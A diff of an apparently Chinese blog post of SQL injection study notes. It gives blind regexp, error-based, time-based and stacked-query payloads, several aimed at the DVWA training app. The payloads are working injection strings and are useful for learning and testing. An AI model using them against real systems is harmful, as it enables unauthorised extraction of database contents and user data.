-<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p><img src="/2020/11/08/SQL/%E5%93%88%E5%93%88%E5%93%88.jpg" srcset="/img/loading.gif" alt="哈哈哈"></p>
+<span class="hljs-string">&#x27; and ((select schema_name from information_schema.schemata limit 0,1) regexp&#x27;</span>^i[a-z]<span class="hljs-string">&#x27; )=1 --+//正则猜测第一个数据库的名字</span>
+<span class="hljs-string"> </span>
+<span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> ((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)regexp <span class="hljs-string">&#x27;^g[a-z]&#x27;</span> )=<span class="hljs-number">1</span> <span class="hljs-comment">--+//正则猜测dvwa数据库里第一个表的名字</span>
+ 
+<span class="hljs-string">&#x27; and ((select column_name from information_schema.columns where table_schema=&#x27;</span>dvwa<span class="hljs-string">&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1) regexp &#x27;</span>^u[a-z]<span class="hljs-string">&#x27; )=1 --+//正则猜测dvwa数据库里的users表里的第一个值</span>
+<span class="hljs-string"> </span>
+<span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> ((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dvwa.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) regexp <span class="hljs-string">&#x27;^a[a-z]&#x27;</span> )=<span class="hljs-number">1</span> <span class="hljs-comment">--+//正则猜测dvwa数据库里的users表里的user字段里的第一个值</span></code></pre>
+<h4 id="like匹配注入"><a class="header-anchor" href="#like匹配注入">🍭</a>like匹配注入</h4>
+<pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;ro%&#x27;</span></code></pre>
+<h3 id="报错注入"><a class="header-anchor" href="#报错注入">🍭</a>报错注入</h3>
+<h4 id="floor-和rand"><a class="header-anchor" href="#floor-和rand">🍭</a>floor()和rand()</h4>
+<pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> count(*),<span class="hljs-number">2</span>,concat(<span class="hljs-string">&#x27;:&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-string">&#x27;:&#x27;</span>,floor(rand()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a   //利用错误信息得到当前数据库名</code></pre>
+<h4 id="extractvalue"><a class="header-anchor" href="#extractvalue">🍭</a>extractvalue()</h4>
+<pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> and extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e))</code></pre>
+<h4 id="updatexml"><a class="header-anchor" href="#updatexml">🍭</a>updatexml()</h4>
+<pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)</code></pre>
+<h4 id="geometrycollection"><a class="header-anchor" href="#geometrycollection">🍭</a>geometrycollection()</h4>
+<pre><code class="hljs n1ql">id=1 and geometrycollection((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre>
+<h4 id="multipoint"><a class="header-anchor" href="#multipoint">🍭</a>multipoint()</h4>
+<pre><code class="hljs n1ql">id=1 and multipoint((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre>
+<h4 id="polygon"><a class="header-anchor" href="#polygon">🍭</a>polygon()</h4>
+<pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> polygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre>
+<h4 id="multipolygon"><a class="header-anchor" href="#multipolygon">🍭</a>multipolygon()</h4>
+<pre><code class="hljs n1ql">id=1 and multipolygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre>
+<h4 id="linestring"><a class="header-anchor" href="#linestring">🍭</a>linestring()</h4>
+<pre><code class="hljs n1ql">id=1 and linestring((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre>
+<h4 id="multilinestring"><a class="header-anchor" href="#multilinestring">🍭</a>multilinestring()</h4>
+<pre><code class="hljs n1ql">id=1 and multilinestring((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre>
+<h4 id="exp"><a class="header-anchor" href="#exp">🍭</a>exp()</h4>
+<pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a))</code></pre>
+<h3 id="时间注入"><a class="header-anchor" href="#时间注入">🍭</a>时间注入</h3>
+<pre><code class="hljs apache"><span class="hljs-attribute">If</span>(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>)) --+//如果前面执行的正确执行<span class="hljs-number">0</span>就为假 ,如果前面错误则执行后面sleep(<span class="hljs-number">5</span>)延迟<span class="hljs-number">5</span>秒</code></pre>
+<h3 id="堆叠查询注入"><a class="header-anchor" href="#堆叠查询注入">🍭</a>堆叠查询注入</h3>
+<pre><code class="hljs apache"><span class="hljs-attribute">id</span> = <span class="hljs-number">1</span>&#x27;;select if(sub(user(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;r&#x27;,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span></code></pre>
+<h3 id="二次注入"><a class="header-anchor" href="#二次注入">🍭</a>二次注入</h3>
+<p><img src="/2020/11/08/SQL/%E5%95%A6%E5%95%A6%E5%95%A6.jpg" srcset="/img/loading.gif" alt="啦啦啦"></p>
+<h3 id="宽字节注入"><a class="header-anchor" href="#宽字节注入">🍭</a>宽字节注入</h3>
+<p><img src="/2020/11/08/SQL/%E5%93%88%E5%93%88%E5%93%88.jpg" srcset="/img/loading.gif" alt="哈哈哈"></p>
 
             </div>
             <hr>
